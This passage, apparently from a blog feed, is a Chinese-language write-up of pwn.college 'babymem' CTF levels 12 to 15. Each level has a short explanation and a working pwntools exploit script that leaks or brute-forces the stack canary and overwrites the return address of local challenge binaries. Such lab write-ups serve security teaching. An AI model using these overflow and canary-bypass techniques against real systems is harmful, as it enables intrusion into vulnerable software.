punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"00"</span>    cancary_value <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cancary_value<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No matching line found"</span><span class="token punctuation">)</span>buffer_size <span class="token operator">=</span> <span class="token number">0x68</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">2</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>buffer_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'A'</span><span class="token operator">*</span> <span class="token number">0x68</span> <span class="token operator">+</span> cancary_value <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token string">b'\x6A'</span> <span class="token operator">+</span> <span class="token string">b'\x1B'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/hacker/memory/level12/babymem_level12.0"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/hacker/memory/level12/babymem_level12.0"</span><span class="token punctuation">)</span>buffer_size <span class="token operator">=</span> <span class="token number">0x78</span> <span class="token operator">+</span> <span class="token number">1</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>buffer_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'REPEAT'</span> <span class="token operator">+</span>  <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x78</span> <span class="token operator">-</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>output <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Backdoor triggered! Repeating challenge()'</span><span class="token punctuation">)</span><span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'^(You said: REPEATA+.*?)$'</span><span class="token punctuation">,</span> output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>MULTILINE<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>    line <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    cancary <span class="token operator">=</span>  line<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0x78</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token number">10</span> <span class="token punctuation">:</span> <span class="token number">0x78</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">7</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">]</span>    hex_str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>byte<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span> <span class="token keyword">for</span> byte <span class="token keyword">in</span> cancary<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"00"</span>    cancary_value <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No matching line found"</span><span class="token punctuation">)</span>buffer_size <span class="token operator">=</span> <span class="token number">0x78</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">2</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>buffer_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'A'</span><span class="token operator">*</span> <span class="token number">0x78</span> <span class="token operator">+</span> cancary_value <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token string">b'\x37'</span> <span class="token operator">+</span> <span class="token string">b'\x24'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>这一关在challenge之前，有一个verfiy函数，他会读取flag的内容到栈空间中。 在调用verfiy函数返回后才调用challenge函数，又碰巧challenge函数的栈空间大于verfiy的栈空间。所以challenge函数的栈空间中包含有verfiy的栈空间。也就是包含了verfiy之前读取到的flag内容。</p><p>又又又恰巧，读取标准输入缓冲区的buffer恰好在verfiy读取flag的内容之前，所以，只要恰好将缓冲区溢出到flag的位置，后续<code>puts</code>函数就会将flag的内容打印出来。</p><p>至于如何计算溢出的字节数，就反编译看一下栈空间，计算一下buffer到flag的字节数就行。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level13.1"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level13.1"</span><span class="token punctuation">)</span>buffer_size <span class="token operator">=</span> <span class="token number">0x1B</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>buffer_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buffer_size <span class="token operator">*</span> <span class="token string">b'A'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level13.0"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level13.0"</span><span class="token punctuation">)</span>buffer_size <span class="token operator">=</span> <span class="token number">0x37</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>buffer_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buffer_size <span class="token operator">*</span> <span class="token string">b'A'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>这个题跟之前不一样的地方，之前是用puts输出，它会从缓冲区的开头一直到遇到一个00子节。但是现在是printf输出，它通过format字符串指定了可以输出的最大字节数<code>printf(&quot;You said: %.424s\n&quot;, (const char *)buf);</code>,而这个大小是小于溢出时可以显示canary的字节数的。</p><p>本题的缓冲区在创建的时候没有初始化，这导致缓冲区中有可能存在有之前函数的栈帧数据还没有被清零。所以可以通过在缓冲区中找可能的canary值。前面也说过了，canary的值的特征就是开头是<code>\x00</code>的八个随机字节组成的随机数。</p><p>.0这一关可以通过打印的栈空间来找。<br>.1只能自己通过gdb，注意按汇编指令执行到<code>fs:26h</code>保存到<code>ebp-8</code>的位置之后，在打印栈空间的内容。然后对比缓冲区中是否包含有canary值。在计算偏移量就行。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level14.1"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level14.1"</span><span class="token punctuation">)</span>buffer_size <span class="token operator">=</span> <span class="token number">19</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">1</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>buffer_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span><span class="token operator">*</span> <span class="token punctuation">(</span>buffer_size<span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>output <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Backdoor triggered! Repeating challenge()'</span><span class="token punctuation">)</span><span class="token comment"># print(output)</span><span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'^(You said: REPEATAAA+.*?)$'</span><span class="token punctuation">,</span> output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>MULTILINE<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>    line <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>    line <span class="token operator">=</span> line<span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">+</span>buffer_size<span class="token punctuation">:</span> <span class="token number">10</span><span class="token operator">+</span>buffer_size<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span>    cancary <span class="token operator">=</span>  line<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span>    hex_str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>byte<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span> <span class="token keyword">for</span> byte <span class="token keyword">in</span> cancary<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"00"</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">)</span>    cancary_value <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Test! </span><span class="token interpolation"><span class="token punctuation">&#123;</span>cancary_value<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No matching line found"</span><span class="token punctuation">)</span>buffer_size <span class="token operator">=</span> <span class="token number">0x1A8</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">2</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>buffer_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x1A8</span> <span class="token operator">+</span> cancary_value <span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span> <span class="token string">b'A'</span> <span class="token operator">+</span>  <span class="token string">b'\x7D\x19'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level14.0"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level14.0"</span><span class="token punctuation">)</span>buffer_size <span class="token operator">=</span> <span class="token number">0x9</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>buffer_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span>output <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Backdoor triggered! Repeating challenge()'</span><span class="token punctuation">)</span><span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'^(You said: REPEATAAA+.*?)$'</span><span class="token punctuation">,</span> output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>MULTILINE<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>    line <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    line <span class="token operator">=</span> line<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">:</span><span class="token number">26</span><span class="token punctuation">]</span>    cancary <span class="token operator">=</span>  line<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span>    hex_str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>byte<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span> <span class="token keyword">for</span> byte <span class="token keyword">in</span> cancary<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"00"</span>    cancary_value <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Test! </span><span class="token interpolation"><span class="token punctuation">&#123;</span>cancary_value<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No matching line found"</span><span class="token punctuation">)</span>buffer_size <span class="token operator">=</span> <span class="token number">0x118</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">2</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>buffer_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x118</span> <span class="token operator">+</span> cancary_value <span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span> <span class="token string">b'A'</span> <span class="token operator">+</span>  <span class="token string">b'\x98\x23'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p>这一关就是爆破了。之前的程序都是独立程序，接受输入，然后输出。这一关的程序变成了服务端和客户端的交互，服务端监听1337端口，客户端向服务端发送数据，服务端使用fork启动新进程处理客户端的连接。这意味着你可以请求连接，然后重复发送数据达到爆破的效果。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">burce_canary_value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    cancary_value <span class="token operator">=</span> <span class="token string">b''</span>    i <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">:</span>        <span class="token comment"># 连接到本地进程</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            conn <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> target_port<span class="token punctuation">)</span>            <span class="token comment"># 打印连接成功的消息</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Connected to local process on port </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_port<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            response <span class="token operator">=</span> conn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size:"</span><span class="token punctuation">)</span>            <span class="token comment"># print(f"Received response: &#123;response.decode()&#125;")</span>            buffer_size_ <span class="token operator">=</span> buffer_size <span class="token operator">+</span> extra_byte <span class="token operator">+</span> i            <span class="token keyword">if</span> cancary_value <span class="token operator">!=</span> <span class="token string">b''</span><span class="token punctuation">:</span>                base_payload <span class="token operator">=</span> <span class="token punctuation">(</span>buffer_size_ <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">b'A'</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">+</span> cancary_value <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                base_payload <span class="token operator">=</span> <span class="token punctuation">(</span>buffer_size_ <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">b'A'</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span>  <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token comment"># 发送数据到本地进程</span>            conn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>buffer_size_<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>base_payload<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>base_payload<span class="token punctuation">)</span>                        <span class="token comment"># 接收本地进程返回的数据</span>            response <span class="token operator">=</span> conn<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"stack smashing detected"</span>  <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"burce success !"</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Received response: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                cancary_value <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token comment"># 关闭连接</span>            conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        i <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cancary_value<span class="token punctuation">)</span>    <span class="token keyword">return</span> cancary_value<span class="token comment"># 设置目标端口（本地进程监听的端口）</span>target_port <span class="token operator">=</span> <span class="token number">1337</span>  <span class="token comment"># 目标端口</span>buffer_size <span class="token operator">=</span> <span class="token number">0x68</span>extra_byte <span class="token operator">=</span> <span class="token number">1</span>cancary <span class="token operator">=</span> burce_canary_value<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># cancary = b'\x95>yh\x90l+'</span>hex_str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>byte<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span> <span class="token keyword">for</span> byte <span class="token keyword">in</span> cancary<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"00"</span>cancary_value <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>cancary_value<span class="token punctuation">)</span>new_buffer_size <span class="token operator">=</span> buffer_size <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token comment"># 动态生成形如 \x17, \x27, \x37, ... \xf7 的字节序列</span>change_address <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> address <span class="token keyword">in</span> change_address<span class="token punctuation">:</span>     conn <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> target_port<span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size:"</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>new_buffer_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> buffer_size <span class="token operator">*</span> <span class="token string">b'A'</span> <span class="token operator">+</span> cancary_value <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token string">b'A'</span> <span class="token operator">+</span> <span class="token string">b'\x5A'</span> <span class="token operator">+</span> address    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    response <span class="token operator">=</span> conn<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"pwn"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-College-Shellcode-Injection-Writeup</title>
      <link href="/2024/07/09/pwn-college-shellcode-injection-writeup/"/>
      <url>/2024/07/09/pwn-college-shellcode-injection-writeup/</url>
      
